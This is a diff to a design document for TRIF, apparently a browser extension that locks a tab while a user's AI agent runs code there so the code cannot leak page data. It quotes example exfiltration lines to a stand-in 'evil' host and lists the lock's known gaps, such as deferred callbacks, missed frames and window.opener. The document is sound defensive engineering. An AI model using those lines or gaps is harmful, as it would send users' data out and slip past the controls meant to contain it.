@@ -23,10 +23,13 @@ tab, TRIF locks the tab (extension/tablock.js): declarativeNetRequest session ru
 browser to that tab, block every request that changes something (POST, PUT, PATCH, DELETE: fetch, XHR,
 sendBeacon, form posts, of any kind), every WebSocket, and anything that could carry what the page shows
 to another site whatever its method: going to another site's page (`location = "https://evil/?" +
-data`), a frame, fetch, XHR or event stream to one. The page's images, scripts, styles, fonts and media
-still load from wherever they do (X's come from twimg.com), so it keeps working. Page code can't get around a rule the browser
-applies; the agent's code, and anything it leaves behind (timers, wrapped functions), lives only as long
-as the page does. The lock lasts until the tab shows a new document: a reload or a real navigation.
+data`), a frame, fetch, XHR or event stream to one, and images, scripts, styles, fonts and media from a
+site the page hadn't already loaded from when the lock started (TL-1: `new Image().src =
+"https://evil/?" + data`). The page keeps loading from the sites it used (X's twimg.com); a site it only
+starts using after the lock (a lazy-loaded image from a new CDN) is blocked until the reload. Page code
+can't get around a rule the browser applies; the agent's code, and anything it leaves behind (timers,
+wrapped functions), lives only as long as the page does. The lock lasts until the tab shows a new
+document: a reload or a real navigation.
 - It's the document that counts, not the URL (a single-page site changes the URL without a new
   document, and so could the agent's code): a marker in the extension's isolated world, which page code
   can't see or set, is set in the document when the lock starts, and the lock lifts when the tab's
@@ -34,20 +37,65 @@ as the page does. The lock lasts until the tab shows a new document: a reload or
 - A document restored from the back/forward cache brings its code back: its marker locks the tab again
   and reloads the page.
 - Tabs a locked tab opens are locked while it is.
+- **The whole site, while one of its tabs is locked** (TL-2, TL-4, TL-5): rules on what the site's pages
+  start (`initiatorDomains`), in every tab and in none:
+  - its writes and sockets are blocked everywhere: in requests no tab owns (tabId −1: a SharedWorker made
+    from a `blob:` URL, the site's own service worker passing a fetch through) and in the site's other
+    tabs, which show the paused icon and a one-line notice too ("your agent ran code in another tab",
+    with a button to show it), as does a tab of the site opened during the lock;
+  - its requests from no tab can't reach other sites (the tab's own rule);
+  - it can't send a tab that didn't exist when the lock started to another site: a popup, `noopener` or
+    not, is blocked at its first request, before TRIF has even seen the tab. The user's own new tabs
+    (typed addresses, bookmarks) have no initiator and load as usual, and the site's tabs that were
+    already open can still follow links out.
+  The other tabs unlock when the last tab the agent ran code in unlocks. Several tabs with agent code:
+  each unlocks on its own new page, and the site stays locked until all of them have. Cost: while the
+  lock lasts, the user can't post from the site's other tabs either.
+- **What the code leaves in the site's storage** (TL-3):
+  - The agent's code can't save: before it runs, TRIF wraps the page's storage writers (localStorage and
+    sessionStorage, their methods and named properties; IndexedDB open, delete and object-store and
+    cursor writes; `document.cookie` and `cookieStore`; Cache Storage; service worker registration) to
+    refuse a call while the agent's code is on the call stack, told by the `sourceURL` its run code gets
+    (`trif-run-<runId>.js`). The error says "TRIF: your agent's code can't save data on this site", and
+    reaches the agent. The site's own calls pass untouched. A speed bump, not a wall: a wrapped function
+    the code hands to the browser to call later (bound, through a microtask, or as a native callback)
+    runs with no agent code on the stack; a realm the guard misses (a frame reached some other way, a
+    window the code opens) has the originals. Same-origin frames the page reaches through `contentWindow`
+    or `contentDocument` get the guard too.
+  - When the lock starts, TRIF takes a fingerprint of the site's stored state from the isolated world
+    (Cache Storage names and keys, service worker registrations, localStorage and sessionStorage,
+    IndexedDB names and versions, the cookies the page can see) and compares it on the new page, before
+    unlocking (the lock's rules still apply to that page). Cache Storage or service workers changed:
+    TRIF clears just those, for the site's origin, from the isolated world (no `browsingData`
+    permission: TRIF doesn't have it, and Firefox would ask for it in an update), reloads past the cache,
+    then unlocks. localStorage, sessionStorage, IndexedDB or cookies changed (big sites write their own
+    all the time): it unlocks as usual and adds one quiet line to the site's chat ("<site> saved new data
+    while your agent's code ran. If something on <site> acts strangely, clear its site data in the
+    browser's settings."). Not compared: IndexedDB's contents; HttpOnly cookies (page code can't set them
+    either).
+- **Leak channels that aren't requests** (TL-6): before the agent's code, TRIF puts WebRTC's
+  constructors out of reach in the page (they throw), drops `<link>`s that prefetch, preconnect,
+  prerender or modulepreload, and turns speculation rules into a script type that does nothing, also in
+  frames of the page's own origin as the page reaches into them (extension/tablock.js `leakGuard`). That
+  is a speed bump, not a wall: it runs in the page's own world, so a realm it misses (a frame reached
+  some other way, a window the code opens) has the originals; a `<link>` written as HTML is removed only
+  after the browser may have acted on it; DNS prefetch the browser does on its own; and an extension
+  can't stop WebRTC fully without the `privacy` permission, which TRIF doesn't ask for.
 - No lock, no code: if the lock can't be set up (no declarativeNetRequest; a browser that drops the
-  per-tab condition, checked by reading the rules back), `trif run` fails and the code doesn't run.
+  per-tab or initiator condition, checked by reading the rules back), `trif run` fails and the code
+  doesn't run.
 - Reading the page, clicks, key presses and the mod's own test events work as before: in 50 real runs,
   every input an agent sent was to drive its own mod, none needed to send a request.
 - The page's own requests in that document are blocked too (X's "Something went wrong"), and links to
-  other sites don't open from it. The panel says the tab is locked, with a button that reloads it (or,
-  when the tab was sent to a blocked page, takes it back to the page it was locked on).
+  other sites don't open from it. The panel says the tab is locked, in one line with a button that
+  reloads it (or, when the tab was sent to a blocked page, takes it back to the page it was locked on),
+  and TRIF's toolbar icon for that tab shows the robot with a pause sign for eyes until it unlocks.
 
-Not covered: an image, script, style, font or media load whose address carries data to another site
-(many sites' content security policies, X's among them, limit where those can come from; others don't),
-a service worker's requests, writes to the page's storage (localStorage, cookies, drafts) that the site
-reads after the reload, and the tab that opened the locked one when it kept a `window.opener` link. A page
-restored from the back/forward cache could run for a few milliseconds before it's locked again. The
-terminal's `trif run` (the user's own agent, which already has their shell) doesn't lock.
+Not covered: the tab that opened the locked one when it kept a `window.opener` link; a cross-site
+subresource that matches a site the page already used (its address can still carry data there); what
+TL-6 above leaves open; the contents of IndexedDB. A page restored from the back/forward cache could run
+for a few milliseconds before it's locked again. The terminal's `trif run` (the user's own agent, which
+already has their shell) doesn't lock. docs/TABLOCK-AUDIT.md has each item and what the tests showed.
 
 ## Mods: held by what their code does (0.3)
 
